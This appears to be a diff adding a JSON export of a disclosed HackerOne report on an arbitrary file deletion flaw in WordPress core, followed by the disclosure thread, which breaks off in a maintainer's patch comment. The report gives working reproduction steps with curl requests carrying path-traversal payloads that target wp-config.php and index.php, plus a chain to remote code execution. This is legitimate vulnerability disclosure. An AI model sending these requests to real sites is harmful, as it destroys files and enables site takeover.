@@ -1,0 +1,1009 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2018-07-30T13:47:01.536Z", 
+    "voters": [
+        "hunter", 
+        "mik317", 
+        "inhibitor181", 
+        "eveeez", 
+        "muhammad_uwais", 
+        "an0nym0us", 
+        "apapedulimu", 
+        "kaleemgiet", 
+        "mefkan", 
+        "cryptographer", 
+        "and 4 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": false, 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 291878, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": null, 
+    "vulnerability_information": "Vulnerable place 1: `wp-admin/post.php`\n`$newmeta['thumb']` is placed into DB not sanitized directly from user input.\n```\ncase 'editattachment':\n    check_admin_referer('update-post_' . $post_id);\n    // Don't let these be changed\n    unset($_POST['guid']);\n    $_POST['post_type'] = 'attachment';\n    // Update the thumbnail filename\n    $newmeta = wp_get_attachment_metadata( $post_id, true );\n    $newmeta['thumb'] = $_POST['thumb'];\n    wp_update_attachment_metadata( $post_id, $newmeta );\n``` \nVulnerable place 2: `wp_delete_attachment` \nThere we have `$meta = wp_get_attachment_metadata( $post_id );` and below in the code:\n```\nif ( ! empty($meta['thumb']) ) {\n        // Don't delete the thumb if another attachment uses it.\n        if (! $wpdb->get_row( $wpdb->prepare( \"SELECT meta_id FROM $wpdb->postmeta WHERE meta_key = '_wp_attachment_metadata' AND meta_value LIKE %s AND post_id <> %d\", '%' . $wpdb->esc_like( $meta['thumb'] ) . '%', $post_id)) ) {\n            $thumbfile = str_replace(basename($file), $meta['thumb'], $file);\n            /** This filter is documented in wp-includes/functions.php */\n            $thumbfile = apply_filters( 'wp_delete_file', $thumbfile );\n            @ unlink( path_join($uploadpath['basedir'], $thumbfile) );\n        }\n    }\n```\nThis means we can craft any value from the `wp-admin` for `thumb` property and that value to be sent towards `@unlink`\n\nHow to reproduce:\n\n1. Upload image via media menu e.g. new\n2. Go to edit post (old fashioned way)\n3. Grad the `id`, `_wpnonce` and choose your payload `../../../../wp-config.php`\n4. Craft your payload(set auth cookies, ua, referrers, ...): \n```\ncurl 'http://localhost/ripsa/wpvuln/wp-admin/post.php?post=[your_postid]&action=editattachment&_wpnonce=[yournonce]' -H 'place your client headers: ua, cookies in order to mimic the authenticated user ' -d 'thumb=../../../../wp-config-slavco.php' --compressed \n```\n5. Delete the file from the admin\n\nImpact:\n1. Requires user that have permission to manipulate media files / posts\n2. Hard to be spotted because:\n2.1 Payload is deleted from DB\n2.2 `@unlink` won't rise error in case of any failed attempts\n3. Affects many blogging/publishing, e-commerce, ...  setups.\n\nAttack:\n1. Delete `wp-config.php` and relaunch wp setup with remote attackers db - RCE \n2. Delete `.htaccess` or any another `index.html`/`index.php` in order to disclose any stored data under web accessible directory\n", 
+    "activity_page_count": 1, 
+    "severity": {
+        "metrics": {
+            "confidentiality": "high", 
+            "privileges_required": "low", 
+            "user_interaction": "none", 
+            "attack_vector": "network", 
+            "attack_complexity": "low", 
+            "scope": "changed", 
+            "integrity": "high", 
+            "availability": "high"
+        }, 
+        "rating": "critical", 
+        "score": 9.9, 
+        "author_type": "User"
+    }, 
+    "title": "Arbitrary file deletion in wp-core - guides towards RCE and information disclosure", 
+    "is_member_of_team?": null, 
+    "vote_count": 14, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": {
+        "asset_identifier": "WordPress Core", 
+        "max_severity": "critical", 
+        "databaseId": 2750, 
+        "asset_type": "SOURCE_CODE"
+    }, 
+    "allow_singular_disclosure_at": "2018-08-29T13:47:01.687Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-20T17:20:19.514Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-20T17:20:19.514Z", 
+            "actor": {
+                "username": "voldemortensen", 
+                "url": "/voldemortensen", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/090/577/6fe6df6ee31d26bb0451a10b5d28d2490b500c30_medium.gif?1471148661"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "Hey @slavco, thank you for reporting this to us. I just wanted to let you know that I'm taking a look at this right now.", 
+            "markdown_message": "<p>Hey <a href=\"/slavco\">@slavco</a>, thank you for reporting this to us. I just wanted to let you know that I&#39;m taking a look at this right now.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2170709, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-22T12:46:24.735Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-22T12:46:24.735Z", 
+            "actor": {
+                "username": "b258ea62bf297b02afa9854", 
+                "url": "/b258ea62bf297b02afa9854", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "Hi there,\nAny problems with this one? It is reported 2 days ago and status is not changed. If there is something unclear feel free to ask.", 
+            "markdown_message": "<p>Hi there,<br>\nAny problems with this one? It is reported 2 days ago and status is not changed. If there is something unclear feel free to ask.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2176497, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-22T16:00:26.031Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-22T16:00:26.031Z", 
+            "actor": {
+                "username": "voldemortensen", 
+                "url": "/voldemortensen", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/090/577/6fe6df6ee31d26bb0451a10b5d28d2490b500c30_medium.gif?1471148661"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "Hey, sorry about that. I see in the code why this is a problem, but I am having trouble reproducing it. I'm going to go ahead and triage this and keep trying to reproduce it. Thanks again for reporting this.", 
+            "markdown_message": "<p>Hey, sorry about that. I see in the code why this is a problem, but I am having trouble reproducing it. I&#39;m going to go ahead and triage this and keep trying to reproduce it. Thanks again for reporting this.</p>\n", 
+            "type": "Activities::BugTriaged", 
+            "id": 2176890, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-22T17:32:47.358Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-22T17:33:09.150Z", 
+            "actor": {
+                "username": "b258ea62bf297b02afa9854", 
+                "url": "/b258ea62bf297b02afa9854", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "Data you need to place in the request below in order to work attack: \n[THIS DATA YOU NEED FROM YOUR LOCAL TARGET]\n```\ncurl 'http://LOCAL.TARGET/wp-admin/post.php?post=[MEDIA_ID]&action=editattachment&_wpnonce=[WPNONCE_USED_TO_EDIT_MEDIA]' -H 'Accept-Encoding: gzip, deflate, br' -H 'Accept-Language: en-US,en;q=0.8' -H 'Upgrade-Insecure-Requests: 1' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8' -H 'Cache-Control: max-age=0' -H 'Cookie: [PLACE YOUR COOKIE VALUES HERE - EXPORT FROM BROWSER]' -H 'Connection: keep-alive' -d 'thumb=../../../../index.php' --compressed\n```\n- [MEDIA_ID] is your post / media ID\n- [WPNONCE_USED_TO_EDIT_MEDIA] change caption of media file and use the same wpnonce for the request above\n- Same applies for cookie values\n\nafter that simply delete permanently file and something like this will be input towards `@unlink` :\n`/your/local/path/wp/wp-content/uploads/2017/11/../../../../index.php`\n", 
+            "markdown_message": "<p>Data you need to place in the request below in order to work attack: <br>\n[THIS DATA YOU NEED FROM YOUR LOCAL TARGET]</p>\n<pre class=\"highlight plaintext\"><code>curl &#39;http://LOCAL.TARGET/wp-admin/post.php?post=[MEDIA_ID]&amp;action=editattachment&amp;_wpnonce=[WPNONCE_USED_TO_EDIT_MEDIA]&#39; -H &#39;Accept-Encoding: gzip, deflate, br&#39; -H &#39;Accept-Language: en-US,en;q=0.8&#39; -H &#39;Upgrade-Insecure-Requests: 1&#39; -H &#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36&#39; -H &#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&#39; -H &#39;Cache-Control: max-age=0&#39; -H &#39;Cookie: [PLACE YOUR COOKIE VALUES HERE - EXPORT FROM BROWSER]&#39; -H &#39;Connection: keep-alive&#39; -d &#39;thumb=../../../../index.php&#39; --compressed\n</code></pre>\n<ul>\n<li>[MEDIA_ID] is your post / media ID</li>\n<li>[WPNONCE_USED_TO_EDIT_MEDIA] change caption of media file and use the same wpnonce for the request above</li>\n<li>Same applies for cookie values</li>\n</ul>\n\n<p>after that simply delete permanently file and something like this will be input towards <code>@unlink</code> :<br>\n<code>/your/local/path/wp/wp-content/uploads/2017/11/../../../../index.php</code></p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2177172, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-22T17:39:25.596Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-22T17:39:25.596Z", 
+            "actor": {
+                "username": "voldemortensen", 
+                "url": "/voldemortensen", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/090/577/6fe6df6ee31d26bb0451a10b5d28d2490b500c30_medium.gif?1471148661"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "Awesome, thank you for the extra information. Looks like I was using the wrong post ID and nonce (using for the post as opposed to the media). I'll try this.\n\nAssuming I can validate this (and I'm sure I will), what is your recommended fix?", 
+            "markdown_message": "<p>Awesome, thank you for the extra information. Looks like I was using the wrong post ID and nonce (using for the post as opposed to the media). I&#39;ll try this.</p>\n\n<p>Assuming I can validate this (and I&#39;m sure I will), what is your recommended fix?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2177188, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-22T18:11:30.861Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-22T18:11:30.861Z", 
+            "actor": {
+                "username": "b258ea62bf297b02afa9854", 
+                "url": "/b258ea62bf297b02afa9854", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "Validate it first, then we can jump into real problem. I would suggest, if possible, your side ( wp core team ) to provide patch then if needed maybe I can say something, but I really doubt it would be taken into consideration :)", 
+            "markdown_message": "<p>Validate it first, then we can jump into real problem. I would suggest, if possible, your side ( wp core team ) to provide patch then if needed maybe I can say something, but I really doubt it would be taken into consideration :)</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2177306, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-11-22T18:56:50.799Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-11-22T18:56:50.799Z", 
+            "actor": {
+                "username": "voldemortensen", 
+                "url": "/voldemortensen", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/090/577/6fe6df6ee31d26bb0451a10b5d28d2490b500c30_medium.gif?1471148661"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "Again, thanks for that extra info, with it I was able to reproduce the issue. I'll start working on a patch and pass it along when I've got something.", 
+            "markdown_message": "<p>Again, thanks for that extra info, with it I was able to reproduce the issue. I&#39;ll start working on a patch and pass it along when I&#39;ve got something.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2177466, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-12-12T17:22:35.520Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-12-12T17:22:35.520Z", 
+            "actor": {
+                "username": "b258ea62bf297b02afa9854", 
+                "url": "/b258ea62bf297b02afa9854", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "What is the status of this one? Any progress? ", 
+            "markdown_message": "<p>What is the status of this one? Any progress? </p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2217767, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-12-18T16:59:36.028Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-12-18T16:59:36.028Z", 
+            "actor": {
+                "username": "voldemortensen", 
+                "url": "/voldemortensen", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/090/577/6fe6df6ee31d26bb0451a10b5d28d2490b500c30_medium.gif?1471148661"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "Hey @slavco, sorry for the silence on this one. Between school, work, family, and the holidays, I haven't had as much time as I would have hoped to work on this. Initially I thought we could just call `validate_file` on the file path, but currently relative paths are allowed and to disallow all relative paths could break quite a few sites. @jjj had a good idea regarding this. He suggested migrating everything to `wp_delete_file` and not allowing anything outside of ABSPATH to be deleted (with blacklists for wp-config.php and other sensitive files). We could then add a filter to allow those who have WP_CONTENT_DIR outside of ABSPATH to keep working.\n\n> but I really doubt it would be taken into consideration :)\nRegarding that, I'm all ears for you suggestions. I promise that I will consider any suggestions you make. I can't promise that will be the exact fix, but the more view points we have the better.\n\nThank you again for responsible disclosure of this.", 
+            "markdown_message": "<p>Hey <a href=\"/slavco\">@slavco</a>, sorry for the silence on this one. Between school, work, family, and the holidays, I haven&#39;t had as much time as I would have hoped to work on this. Initially I thought we could just call <code>validate_file</code> on the file path, but currently relative paths are allowed and to disallow all relative paths could break quite a few sites. <a href=\"/jjj\">@jjj</a> had a good idea regarding this. He suggested migrating everything to <code>wp_delete_file</code> and not allowing anything outside of ABSPATH to be deleted (with blacklists for wp-config.php and other sensitive files). We could then add a filter to allow those who have WP_CONTENT_DIR outside of ABSPATH to keep working.</p>\n\n<blockquote>\n<p>but I really doubt it would be taken into consideration :)<br>\nRegarding that, I&#39;m all ears for you suggestions. I promise that I will consider any suggestions you make. I can&#39;t promise that will be the exact fix, but the more view points we have the better.</p>\n</blockquote>\n\n<p>Thank you again for responsible disclosure of this.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2231905, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-12-18T17:12:32.836Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-12-18T17:12:32.836Z", 
+            "actor": {
+                "username": "b258ea62bf297b02afa9854", 
+                "url": "/b258ea62bf297b02afa9854", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "Nice to hear there is work in progress on this one. Any idea regarding release date (I'm not pushing here, just want to know what is expected release date for this fix)", 
+            "markdown_message": "<p>Nice to hear there is work in progress on this one. Any idea regarding release date (I&#39;m not pushing here, just want to know what is expected release date for this fix)</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2232011, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-01-09T14:36:57.355Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-01-09T14:36:57.355Z", 
+            "actor": {
+                "username": "b258ea62bf297b02afa9854", 
+                "url": "/b258ea62bf297b02afa9854", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "Hi all, any activity on this one and release date if possible ?", 
+            "markdown_message": "<p>Hi all, any activity on this one and release date if possible ?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2272455, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-01-20T22:56:12.013Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-01-20T22:56:12.013Z", 
+            "actor": {
+                "username": "b258ea62bf297b02afa9854", 
+                "url": "/b258ea62bf297b02afa9854", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "Critical issue reported 2 months ago and due the fact the issue is straight forward confirmed, located, verified there isn't even fix proposal or time frame when will be fixed given.  ", 
+            "markdown_message": "<p>Critical issue reported 2 months ago and due the fact the issue is straight forward confirmed, located, verified there isn&#39;t even fix proposal or time frame when will be fixed given.  </p>\n", 
+            "type": "Activities::HackerRequestedMediation", 
+            "id": 2304143, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-01-21T15:11:42.877Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-01-21T15:11:42.877Z", 
+            "actor": {
+                "username": "aaroncampbell", 
+                "url": "/aaroncampbell", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/020/821/6f1bfb789e2f97a2c2ca81a5e6ab6f7b3581ad4a_medium.jpg?1515860728"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "Hey @slavco,\n\nAs @voldemortensen said in his last update, holidays and other commitments have taken up a lot of his time. Unfortunately this is true for quite a few of our volunteers over the last month. Combining that with the fact that this is reproducible but definitely not simple to fix, has meant that things are taking a while. I'll see if I can get someone else to lend a hand to try to speed things up here, but we certainly haven't forgotten about it.\n\nThanks,\nAaron", 
+            "markdown_message": "<p>Hey <a href=\"/slavco\">@slavco</a>,</p>\n\n<p>As <a href=\"/voldemortensen\">@voldemortensen</a> said in his last update, holidays and other commitments have taken up a lot of his time. Unfortunately this is true for quite a few of our volunteers over the last month. Combining that with the fact that this is reproducible but definitely not simple to fix, has meant that things are taking a while. I&#39;ll see if I can get someone else to lend a hand to try to speed things up here, but we certainly haven&#39;t forgotten about it.</p>\n\n<p>Thanks,<br>\nAaron</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2304813, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-01-21T15:47:21.320Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-01-21T15:47:21.320Z", 
+            "actor": {
+                "username": "b258ea62bf297b02afa9854", 
+                "url": "/b258ea62bf297b02afa9854", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "Again, I know that backward compatibility is really hard to be achieved and it is time consuming. I'm asking regarding simple time frame e.g. when it is expected to be fixed. That is it. Answer could be:\n- in one month\n- in 6 months\n- in one year\nI really don't care, just want to know rough planned release date. That it is!", 
+            "markdown_message": "<p>Again, I know that backward compatibility is really hard to be achieved and it is time consuming. I&#39;m asking regarding simple time frame e.g. when it is expected to be fixed. That is it. Answer could be:</p>\n\n<ul>\n<li>in one month</li>\n<li>in 6 months</li>\n<li>in one year\nI really don&#39;t care, just want to know rough planned release date. That it is!</li>\n</ul>\n", 
+            "type": "Activities::Comment", 
+            "id": 2304843, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-01-24T15:14:12.034Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-01-24T15:14:12.034Z", 
+            "actor": {
+                "username": "aaroncampbell", 
+                "url": "/aaroncampbell", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/020/821/6f1bfb789e2f97a2c2ca81a5e6ab6f7b3581ad4a_medium.jpg?1515860728"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "Hey @slavco,\n\nMy best estimate on this one would be somewhere around the 6 month time frame. Unfortunately we don't actually set release dates that far in advance, so it's hard to give you a date. However, it should be fixed by the end of July. I've set calendar reminders to make sure I check in on this regularly.\n\nThanks,\nAaron\n\n", 
+            "markdown_message": "<p>Hey <a href=\"/slavco\">@slavco</a>,</p>\n\n<p>My best estimate on this one would be somewhere around the 6 month time frame. Unfortunately we don&#39;t actually set release dates that far in advance, so it&#39;s hard to give you a date. However, it should be fixed by the end of July. I&#39;ve set calendar reminders to make sure I check in on this regularly.</p>\n\n<p>Thanks,<br>\nAaron</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2313713, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-01-24T16:14:33.866Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-01-24T16:14:33.866Z", 
+            "actor": {
+                "username": "b258ea62bf297b02afa9854", 
+                "url": "/b258ea62bf297b02afa9854", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "+1 will ping you in 6 months, before that if something is unclear feel free to poke me here.", 
+            "markdown_message": "<p>+1 will ping you in 6 months, before that if something is unclear feel free to poke me here.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2313929, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2018-05-24T13:56:03.573Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-05-24T13:56:03.573Z", 
+            "actor": {
+                "username": "b258ea62bf297b02afa9854", 
+                "url": "/b258ea62bf297b02afa9854", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "Hi, the issue presented here I have found while I was at ripstech. I got an email that they plan to publish it this week or next one. Do you have any info or progress on this one?", 
+            "markdown_message": "<p>Hi, the issue presented here I have found while I was at ripstech. I got an email that they plan to publish it this week or next one. Do you have any info or progress on this one?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 2791422, 
+            "genius_execution_id": null
+        }, 
+        {
+            "attachments": [
+                {
+                    "url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/312/748/ce8c0fc2d4bfc7f8e3614b7fe25634e814e17c18/editattachment.patch?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWS2CSUE3%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221727Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDNFtI3gdfN0FFddCnSK3A%2FNn8rGoRLECenibnPQxlYfOkhD533uSo6Jsi4CGisj6U81IFoE7NBEuPv%2BUT2dP%2BOOfq6zDsTXqsfa%2B9BuuRNIyl27dmo7gw2zBlEjVTSMZKI8B0zj4q4GeD0gX7YDUvrqCnrwfrQpq6BHV5kFcBvzP%2FNnVou4jydvq2EcrKGQeGmq4afFHwdD5CN5DoFnFHkXlCLPVWCK%2FpO5NMVMdWRvVyk90BTGTkyTY5IWuz0%2B08qqd5UcN1WLfvK4E3S6jTn5eK%2FSX5o5meFKi0SmtPddLVR5u8xNOgccHPaVXRO5KIBBCZ5yilpXGFhVd%2FmfBeI1lJ6Zc7kOal7ihq3TcrVPP%2FopjPjQdAVdt9an7SXkRFGjCeWjyWfPwghBaIoGvWhM9OHPkS94WN%2FukqeEoK1pVo2cJuAYnallyv%2Fvqjndvr%2BodZqbfFrY5T9ebirMMIoriCBo2Xkpz9lw7EjTK4aWQBSBYrDh4Xl4%2FXmR8N0VkEu6LxpbUd0lfl%2Fjh1nqnK2KhGRbixj81Rq6v9WRwhjH%2FADPcK25w6aq3rFp1RLV%2B6mj273p2%2FLR6yf68LZuCXsY5sDs2Xf0oo46m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e94a8799c1297b7271644b82a1aac36780623ff6cf37f3212ea44ed61092e012", 
+                    "type": "text/x-diff", 
+                    "id": 312748, 
+                    "filename": "editattachment.patch"
+                }
+            ], 
+            "automated_response": false, 
+            "created_at": "2018-06-27T01:58:28.682Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-06-27T02:00:30.401Z", 
+            "actor": {
+                "username": "jjj", 
+                "url": "/jjj", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/007/063/f0ecb61257fb59110ccaf6a05e1f663467451915_medium.jpg?1402001230"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "Hey everyone,\n\nI've spent the past 5 hours investigating this, and am attaching what I believe is the best available patch given the circumstances and requirements.\n\nAll it does is run `$_POST['thumb']` through `validate_file()` and `wp_die()` on failure.\n\n----\n\nMy reasoning with such a simple approach only on submission, is that WordPress does not perform any file path protection elsewhere. If we _are_ going to introduce a safety measure to prevent critical file deletion (and my personal opinion is that we should) that fix should be handled globally, in such a way that plugins and themes opting into using `wp_delete_file()` would be protected, and outside of this fix specifically.\n\nPlugins or themes calling `unlink()` directly will always be free to behave badly, and WordPress should provide the best tooling within itself as an application to prevent accidents, while trusting the rest of the server to be configured in such a way that important application files (like WordPress core files) cannot be blindly unlinked.\n\n----\n\nMy attached patch is a backwards compatibility break. Plugins attempting to pass a relative file path to this very-old `'thumb'` parameter (normally only accessed via a pre-3.0 admin screen) will now fail, but I believe that break is worth it here, given both the age of that code and how unlikely it is to be relied upon in the wild.\n\nWe try to get consensus from the team when backwards compatibility breaks are necessary. It's also possible my suggested fix is not the best approach, but this is my progress from tonight so I wanted to update everyone.\n\n----\n\nIt's hard to put into words how frustrating and embarrassing it is for issues to go stale like this one did, from both sides of the issue fwiw. I'm sorry this went ignored. I know my apology means very little, but it needs to be said and I do feel all of these things.\n\nWhen there is progress, one of us will update here.\n\nThanks,\n-JJJ", 
+            "markdown_message": "<p>Hey everyone,</p>\n\n<p>I&#39;ve spent the past 5 hours investigating this, and am attaching what I believe is the best available patch given the circumstances and requirements.</p>\n\n<p>All it does is run <code>$_POST[&#39;thumb&#39;]</code> through <code>validate_file()</code> and <code>wp_die()</code> on failure.</p>\n\n<hr>\n\n<p>My reasoning with such a simple approach only on submission, is that WordPress does not perform any file path protection elsewhere. If we <u>are</u> going to introduce a safety measure to prevent critical file deletion (and my personal opinion is that we should) that fix should be handled globally, in such a way that plugins and themes opting into using <code>wp_delete_file()</code> would be protected, and outside of this fix specifically.</p>\n\n<p>Plugins or themes calling <code>unlink()</code> directly will always be free to behave badly, and WordPress should provide the best tooling within itself as an application to prevent accidents, while trusting the rest of the server to be configured in such a way that important application files (like WordPress core files) cannot be blindly unlinked.</p>\n\n<hr>\n\n<p>My attached patch is a backwards compatibility break. Plugins attempting to pass a relative file path to this very-old <code>&#39;thumb&#39;</code> parameter 